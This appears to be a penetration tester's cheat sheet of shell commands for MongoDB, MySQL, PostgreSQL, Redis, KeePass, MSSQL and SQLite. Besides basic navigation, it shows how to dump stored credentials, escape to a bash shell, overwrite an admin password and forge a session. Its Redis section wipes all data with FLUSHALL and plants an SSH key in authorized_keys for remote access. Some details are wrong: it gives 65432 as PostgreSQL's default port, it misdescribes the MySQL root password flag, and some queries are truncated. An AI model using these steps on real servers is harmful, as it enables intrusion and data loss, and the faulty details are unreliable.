# Database Navigation

# MONGODB SHELL NAVIGATION

## Commands

#### 1) 

    mongo
    mongo "mongodb://localhost:27017"

#### 2) 

    show databases;

#### 3) 

    use DATABASE;

#### 4) 

    show tables;

#### 5) 

    db.TABLE.find() (Dump everything from table)

#### More commands

    > use <DATABASE>;
    > show tables;
    > show collections;
    > db.system.keys.find();
    > db.users.find();
    > db.getUsers();
    > db.getUsers({showCredentials: true});
    > db.accounts.find();
    > db.accounts.find().pretty();
    > use admin;
    > show dbs # List databases
    > use <db> # Switch to the desired database
    > show collections # List collections in the selected database
    > db.<collection>.find() # Dump the contents of a collection
    > db.<collection>.count() # Get the number of records in the collection
    > db.current.find({"username":"admin"}) # Search for a specific user

# MYSQL SHELL NAVIGATION

#### 1) 

    mysql -u USER -h HOST -p PASSWORD

#### 2) 

    show databases;

#### 3) 

    use DATABASE;

#### 4) 

    show tables;

#### 5) 

    SELECT * FROM TABLE; (Dump everything from table)

#### 6) Drop a shell

    \! /bin/bash

#### 7) Update a user's password in the database (requires root access or database ownership privileges)

    update TABLE SET password='HASH_HERE' WHERE username='admin';

## For root authentication there is a small detail:

#### 

    mysql -h HOST -u root -proot ROOT_PASS -e 'SQL_QUERY;' (Use the -proot flag for the password of the root user in a db)

# POSTGRESQL SHELL NAVIGATION

#### 1) 

    psql -h IP_ADDRESS -U USER DATABASE

#### 

    psql.exe -h 127.0.0.1 -p 65432 -U postgres -d DATABASE -c "SQL COMMAND" (Default port for postgresql is 65432)

#### 2) 

    \list (List all databases)

#### 3) 

    \c DATABASE (Use database)

#### 4) 

    \dt (Shows tables of the database)

#### 5)

    \du (List users roles)

#### 6) 

    select * from TABLE;

#### 7)

    SHOW rds.extensions; (List installed extensions)

# REDIS-CLI SHELL NAVIGATION

#### 1) 

    redis-cli -h HOST -u USER -a PASSWORD -p PORT

#### 2) 

    CONFIG GET * (Query the configuration of the redis instance)

#### More commands

    > AUTH <PASSWORD>
    > AUTH <USERNAME> <PASSWORD>
    > INFO SERVER
    > INFO keyspace
    > CONFIG GET *
    > SELECT <NUMBER>
    > KEYS *
    > HSET // set value if a field within a hash data structure
    > HGET // retrieves a field and his value from a hash data structure
    > HKEYS // retrieves all field names from a hash data structure
    > HGETALL // retrieves all fields and values from a hash data structure
    > GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
    > SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"

#### Enter our own SSH key to server

    redis-cli -h <RHOST>
    
    echo "FLUSHALL" | redis-cli -h <RHOST>

    (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt

    cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key

    <RHOST>:6379> get s-key

    <RHOST>:6379> CONFIG GET dir

    1) "dir"

    2) "/var/lib/redis"

    <RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh

    OK

    <RHOST>:6379> CONFIG SET dbfilename authorized_keys

    OK

    <RHOST>:6379> CONFIG GET dbfilename

    1) "dbfilename"

    2) "authorized_keys"

    <RHOST>:6379> save

    OK

# KPCLI SHELL NAVIGATION (ALTERNATIVE: KEEPASS2 WHICH IS A GUI)

#### 1) 

    kpcli

#### 2) 

    open DATABASE.kdbx (Connect to the Keepass database. Keep in mind you need to enter credentials to successfully connect)

#### 3) 

    ls (List files)

#### 4) 

    cd DIR (Change directory)

#### 5) 

    show NUM -f (Print contents of the specified file)

# MSSQL SHELL NAVIGATION (sqsh)

#### 1) 

    sqsh -S IP_ADDRESS:1433 -U DOMAIN.LOCAL\\USERNAME -P 'PASSWORD'

# SQLCMD 

#### 1) 

    sqlcmd -S SERVER.COM -U DBUSER -P 'PASSWORD' -d DATABASE_NAME -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE"

#### 2) 

    sqlcmd -S SERVER.COM -U DBUSER -P 'PASSWORD' -d DATABASE_NAME -Q "SELECT * FROM Target_Table_to_dump"

# SQLITE3

#### 1) 

    sqlite3 DATABASE.sqlite

#### 2) 

    .tables

#### 3) 

    select * from users;

# OPENQUERY

    1> select * from openquery("web\clients", 'select name from master.sys.databases');
    2> go

    1> select * from openquery("web\clients", 'select name from clients.sys.objects');
    2> go

#### Binary Extraction as Base64

    1> select cast((select content from openquery([web\clients], 'select * from clients.sys.objects');
    2> go > export.txt
